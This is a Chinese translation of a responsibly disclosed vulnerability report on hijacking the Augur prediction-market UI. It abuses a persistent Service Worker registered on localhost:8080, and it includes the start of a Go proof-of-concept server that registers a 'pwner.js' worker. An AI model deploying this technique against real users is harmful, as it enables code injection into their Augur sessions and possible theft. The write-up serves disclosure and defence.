# 如何通过休眠服务劫持Augur
|
##### 译文声明
本文是翻译文章，文章来源：medium.com
原文地址：
译文仅供参考，具体内容表达以及含义原文为准。
## 一、前言
这份漏洞报告已于3星期之前发送给Augur，现在经对方允许我将漏洞细节公开。虽然攻击过程本身有点复杂，在实际环境中难以实现，但的确是一种通用型攻击方法，可以适用于多个去中心化应用。
## 二、Augur简介
目前Augur的架构主要由3个独立的层所组成：
1、在最底层，Augur包含建立在以太坊（Ethereum）之上的一系列智能合约（smart
contract）。这层由全局区块链驱动，可以通过由用户或者可信远程实体操作的网关节点来访问。
2、在中间层，Augur包含一个中间服务层，使用（可信）以太坊作为数据源，根据合约日志构建数据库，为基于web的UI提供预先准备好的数据。
3、在最上层，Augur包含由可信Augur节点提供的web UI，用户可以通过 **本地浏览器**
访问`http://localhost:8080`地址来与web UI交互。
在本文中，我们假设以太坊网络、网关以及Augur网关都为可信单元，并且处于正常运行状态。本文攻击的是链条的最后一个环节，即用户端的浏览器，最终实现将任意代码注入Augur
UI中。
## 三、Service Worker简介
> Service
> Worker是独立于web页面，由浏览器在后台运行的一个脚本，可以提供不需要web页面或者用户交互的服务，其核心功能是拦截并处理网络请求。
>
> ~Google Developers
简单总结一下，Service
Worker是现在所有Web浏览器都支持的一种技术，允许网站注册以后台线程形式运行的任意JavaScript，其主要目的是允许脱机缓存，此时Service
Worker可以劫持网络请求并为其提供服务（包括任意更改网络请求）。当用户不具备互联网连接时，Service
Worker可以让JavaScript代码充当临时服务器提供服务。
如果大家想了解更多细节，可以参考[Google开发者页面](https://developers.google.com/web/fundamentals/primers/service-workers/)。从本文的角度来看，（除劫持网络请求这个核心功能以外）最有趣的地方在于Service Work的生命周期以及威胁模型：
1、站点可以在任意时间点安装Service Worker。这个 **Service Worker会一直处于有效执行状态，除非被显式取消注册为止**
。即使页面刷新、完全强制刷新甚至浏览器重启，Service Worker都会处于正常工作状态。Service
Worker并没有与伺服的特定内容绑定，即使面对全新的、不相关的内容，之前注册的Service Worker也会处于活跃状态。
2、不管从哪个角度来看，从设计方面讲Service
Worker天然就是一种MITM攻击，因此存在非常严格的限制策略，只能从HTTPS来运行（确保网站只能注册代码，劫持属于自己的内容），并且注册的源与运行的源必须完全匹配（最严格的同源策略）。然而，
**`localhost`并不受如此严格的限制策略影响**，这样开发者工作起来就比较轻松。
总结出这两点后，我相信大家心里面已经有点数了。
## 四、漏洞利用细节
本文介绍的攻击思路用到了两方面技术，一是滥用现代浏览器的Service
Worker安全策略，二是利用了Augur在浏览器中运行UI这种设计特点，将两者结合起来后，可以实现无缝劫持所有的Augur通信数据，同样也能将任意代码无缝注入Augur的UI：
1、Augur的UI运行在`http://localhost:8080`，从SSL角度来看并没有经过身份认证。我们无法证明来自不同会话的代码是否属于（或不属于）同一个（或不同的）应用；
2、浏览器会将`localhost`当成开发环境，因此允许站点在没有使用SSL认证的情况下安装并执行Service Worker；
3、Service
Worker在浏览器中处于休眠状态（没有缓存控制，无法预先检测），每次加载相同的源（`http://localhost:8080`）时就会执行。
###  投递载荷
为了劫持Augur，我们首先需要在`localhost:8080`安装一个Service
Worker。该任务至少需要我们在目标主机上运行一次Web服务器，并在用户浏览器加载Augur之前至少加载一次`localhost:8080`。
在分析这个操作的难度之前，我们先演示更加直观的一种方法，以便更好理解攻击过程。先来看看Go语言版本的完全自包含的一段漏洞利用示例代码：
    package main
    import (
        "fmt"
        "net/http"
    )
    func main() {
        // Start a web-server on port 8080, serving the demo HTML and JS injector
        http.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
            fmt.Fprint(w, index)
        })
        http.HandleFunc("/pwner.js", func(w http.ResponseWriter, r *http.Request) {
            w.Header().Set("Content-Type", "text/javascript")
            fmt.Fprint(w, pwner)
        })
        http.ListenAndServe(":8080", nil)
    }
    var index = `
    if ('serviceWorker' in navigator) {
      navigator.serviceWorker.register('/pwner.js')
      .then(function(registration) {
        console.log('Registration successful, scope is:', registration.scope);
      })
      .catch(function(error) {
        console.log('Service worker registration failed, error:', error);
      });
    }